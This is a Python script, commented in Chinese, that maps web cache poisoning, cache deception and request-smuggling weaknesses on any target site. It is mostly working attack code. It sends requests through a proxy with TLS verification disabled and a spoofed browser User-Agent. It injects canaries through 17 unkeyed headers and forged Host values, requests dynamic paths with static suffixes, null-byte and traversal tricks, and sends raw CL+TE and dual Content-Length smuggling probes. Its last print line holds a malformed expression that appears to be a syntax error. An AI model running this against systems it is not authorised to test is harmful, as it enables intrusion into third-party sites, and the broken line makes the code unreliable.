#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Web 缓存投毒/缓存欺骗面测绘脚本（可复用于任意目标）
用法:
  export RS_PROXY=http://127.0.0.1:7892   # 本地 HTTP CONNECT 出口
  export RS_TARGET=example.com
  python probe_cache_poison.py
要点:
  1) 先找"哪个路径带 cl-cache-status / X-Cache / Age"→ 定位缓存层生效范围
  2) 用随机 query 串确认 query 是否进缓存 key
  3) 参数名归一化: 同值换不同参数名/大小写/空名/多余&/;，比对是否命中同一缓存条目
  4) unkeyed 头注入: 17 个常见代理头 + canary，比对响应体/头是否有反射或内容变化
  5) Host 注入: 伪造 Host 看缓存层是否返回自己的校验页并反射 Host
  6) 缓存欺骗: 动态路径追加 .css/.js/.png/;.css/%00.css/.css/%20.css
  7) 走私(检测级): CL+TE 冲突、dual-CL、TE 混淆、chunk-ext —— 每变体只发 1-2 次，禁止并发
关键判定:
  · 投毒成立 = unkeyed 输入被反射进"被缓存"的响应（cl-cache-status: HIT 且内容随注入头变化）
  · 缓存欺骗成立 = 追加静态后缀后拿到"需登录/动态"内容且响应被缓存
  · 只有反射、不缓存 → 只能记反射型，不算缓存投毒
"""
import socket, ssl, sys, time, random, string

PROXY = __import__("os").environ.get("RS_PROXY", "http://127.0.0.1:7892")
TARGET = __import__("os").environ.get("RS_TARGET", "example.com")
PORT = 443

def uq(n=8):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))

def connect():
    """HTTP CONNECT 代理建隧道 + TLS；直连失败时必备（Windows schannel 常不可用）"""
    h, p = PROXY.replace("http://", "").split(":")
    s = socket.create_connection((h, int(p)), timeout=15)
    s.sendall(f"CONNECT {TARGET}:{PORT} HTTP/1.1\r\nHost: {TARGET}:{PORT}\r\n\r\n".encode())
    buf = b""
    while b"\r\n\r\n" not in buf:
        d = s.recv(4096)
        if not d:
            raise RuntimeError("proxy closed")
        buf += d
    if b"200" not in buf.split(b"\r\n")[0]:
        raise RuntimeError("proxy refused: " + buf[:120].decode(errors="replace"))
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["http/1.1"])
    return ctx.wrap_socket(s, server_hostname=TARGET)

def raw(method="GET", path="/", headers=None, body=None, host=None, extra=None, timeout=20):
    hdrs = {"Host": host or TARGET,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0",
            "Accept": "*/*", "Connection": "close"}
    if headers:
        hdrs.update(headers)
    if body and "Content-Length" not in hdrs:
        hdrs["Content-Length"] = str(len(body))
    lines = [f"{method} {path} HTTP/1.1"] + [f"{k}: {v}" for k, v in hdrs.items()]
    if extra:
        lines += extra
    data = ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1", "replace")
    if body:
        data += body if isinstance(body, bytes) else body.encode()
    s = connect()
    try:
        s.sendall(data)
        s.settimeout(timeout)
        resp = b""
        while True:
            try:
                d = s.recv(65536)
            except socket.timeout:
                break
            if not d:
                break
            resp += d
            if len(resp) > 4_000_000:
                break
    finally:
        try: s.close()
        except Exception: pass
    hraw, _, braw = resp.partition(b"\r\n\r\n")
    hl = hraw.decode("latin-1", "replace").split("\r\n")
    hm = {}
    for ln in hl[1:]:
        if ":" in ln:
            k, v = ln.split(":", 1)
            hm.setdefault(k.strip().lower(), []).append(v.strip())
    return (hl[0] if hl else ""), hm, hraw.decode("latin-1", "replace"), braw

if __name__ == "__main__":
    CAN = "poc-" + uq(6) + ".target301.example.com"
    print("== 1. 找缓存层生效范围 ==")
    for p in ["/", "/example.com", "/robots.txt", "/favicon.ico", "/style.css", "/app.js"]:
        st, hm, hr, bd = raw(path=p)
        print(f"  {p:16s} {st[:20]:22s} cl={hm.get('cl-cache-status',['-'])[0]:6s} age={hm.get('age',['-'])[0]:6s} len={len(bd)}")

    print("== 2. query 是否进 key（同路径两个随机值）==")
    a, b = uq(), uq()
    for p in [f"/style.css?cb={a}", f"/style.css?cb={b}", f"/style.css?cb={a}"]:
        st, hm, hr, bd = raw(path=p)
        print(f"  {p:34s} cl={hm.get('cl-cache-status',['-'])[0]:6s} len={len(bd)}")

    print("== 3. 缓存键参数名归一化 ==")
    for p in ["/style.css?cb=1", "/style.css?CB=1", "/style.css?=1",
              "/style.css?cb=1&&", "/style.css?cb=1;x=2", "/style.css?zz=2"]:
        st, hm, hr, bd = raw(path=p)
        print(f"  {p:34s} cl={hm.get('cl-cache-status',['-'])[0]:6s} len={len(bd)}")

    print("== 4. unkeyed 头注入（canary）==")
    base = raw(path="/style.css?inj=" + uq())[3]
    for h in ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server", "X-Forwarded-Scheme",
              "X-Forwarded-Proto", "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-Prefix",
              "X-HTTP-Method-Override", "X-Forwarded-For", "X-Real-IP", "Forwarded",
              "X-Original-Host", "X-Backend-Server", "X-Forwarded-Port", "True-Client-IP",
              "CF-Connecting-IP"]:
        st, hm, hr, bd = raw(path="/style.css?inj=" + uq(), headers={h: CAN})
        changed = bd != base
        refl = CAN.lower() in bd.decode("utf-8", "replace").lower() or CAN.lower() in hr.lower()
        print(f"  {h:24s} cl={hm.get('cl-cache-status',['-'])[0]:6s} len={len(bd):7d} 变化={changed} 反射={refl}")

    print("== 5. Host 注入 ==")
    for h in [CAN, CAN + ".com", "127.0.0.1", TARGET, TARGET.upper(), TARGET + "."]:
        st, hm, hr, bd = raw(path="/", host=h)
        refl = CAN.lower() in bd.decode("utf-8", "replace").lower()
        print(f"  Host={h:24s} {st[:22]:24s} len={len(bd):7d} 反射={refl}")

    print("== 6. 缓存欺骗 ==")
    for p in ["/home.css", "/home.js", "/home.png", "/home;.css", "/home%00.css",
              "/home/.css", "/home%20.css", "/home/..;/favicon.ico", "/api/user/info.css"]:
        st, hm, hr, bd = raw(path=p)
        print(f"  {p:24s} {st[:20]:22s} cl={hm.get('cl-cache-status',['-'])[0]:6s} len={len(bd)}")

    print("== 7. 走私检测（检测级，每变体仅 1 次）==")
    tests = {
        "CL+TE.chunked": b"POST / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: close\r\n\r\n0\r\n\r\n",
        "TE.xchunked":   b"POST / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\nTransfer-Encoding: xchunked\r\nConnection: close\r\n\r\n0\r\n\r\n",
        "dual-CL":       b"POST / HTTP/1.1\r\nHost: " + TARGET.encode() + b"\r\nContent-Length: 5\r\nContent-Length: 6\r\nConnection: close\r\n\r\nABCDE",
    }
    for name, p in tests.items():
        s = connect()
        try:
            s.sendall(p)
            s.settimeout(15)
            r = s.recv(2048)
        except Exception as e:
            r = f"ERR {e}".encode()
        finally:
            try: s.close()
            except Exception: pass
        print(f"  {name:16s} {r.split(b chr(13).encode()) if False else r[:60]!r}")
